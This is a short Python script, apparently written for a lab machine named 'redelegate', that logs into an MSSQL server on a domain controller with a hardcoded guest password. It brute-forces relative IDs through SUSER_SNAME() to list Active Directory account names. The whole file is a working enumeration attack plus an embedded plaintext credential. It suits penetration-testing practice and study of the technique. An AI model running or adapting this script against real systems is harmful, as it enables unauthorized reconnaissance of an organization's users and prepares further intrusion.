import subprocess
import struct 
import re

def main(i):
    result = subprocess.run(["mssqlclient.py", "SQLGuest:zDPBpaF4FywlqIv11vii@dc.redelegate.vl", "-command", f"select SUSER_SNAME(0x010500000000000515000000a185deefb22433798d8e847a{i});"], capture_output=True, text=True)
    return result

def get_default_domain():
    query = subprocess.run(["mssqlclient.py", "SQLGuest:zDPBpaF4FywlqIv11vii@dc.redelegate.vl", "-command", "select DEFAULT_DOMAIN();"], capture_output=True, text=True)
    match = re.search(r'^-+\s*\n(.+)$', query.stdout, re.MULTILINE)
    domain = match.group() if match else ""
    print(domain)

get_default_domain()

for i in range(1000, 1500):
    i = struct.pack('<I', i).hex()
    output = main(i)
    if "NULL" in output.stdout:
        continue
    else:
        pattern = "REDELEGATE.*\n"
        check = re.search(pattern, output.stdout)
        cleaned = check.group() if check else ""
        print(cleaned)

